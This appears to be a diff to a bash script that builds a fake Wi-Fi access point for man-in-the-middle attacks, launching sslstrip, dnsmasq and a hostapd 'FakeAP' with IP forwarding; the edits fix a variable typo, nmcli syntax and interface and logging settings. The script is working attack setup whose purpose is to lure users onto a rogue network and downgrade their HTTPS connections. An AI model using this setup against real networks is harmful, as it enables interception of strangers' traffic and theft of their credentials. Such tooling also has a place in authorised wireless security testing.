@@ -33,7 +33,7 @@ fi
 
 SSLSTRIP_PORT=10000
 INTERFACE1="enp1s0f1"
-INTERFACE12="wlp2s0"
+INTERFACE2="wlp2s0"
 
 detect_init() {
   # init process is pid 1
@@ -159,11 +159,11 @@ nohup sslstrip --listen=$SSLSTRIP_PORT &>/dev/null &
 echo "Stopping NetworkManager"
 stop_service "NetworkManager"
 
-nmcli nm wifi off
+nmcli r wifi off
 rfkill unblock wlan
 
 ifconfig $INTERFACE1 down
-ifconfig $INTERFACE2 up
+ifconfig $INTERFACE2 down
 ifconfig $INTERFACE1 192.168.0.1 netmask 255.255.255.0 up
 ifconfig $INTERFACE2 192.168.0.100 netmask 255.255.255.0 up
 
@@ -182,7 +182,7 @@ iptables -A FORWARD -i $INTERFACE2 -o $INTERFACE1 -j ACCEPT
 sysctl -w net.ipv4.ip_forward=1
 
 echo "Launching DHCP + DNS Server dnsmasq..."
-dnsmasq -C dnsmasq.conf &>/dev/null &
+dnsmasq -C dnsmasq.conf &
 echo "Setting up FakeAP using hostapd..."
 hostapd -B -d hostapd.conf &
 
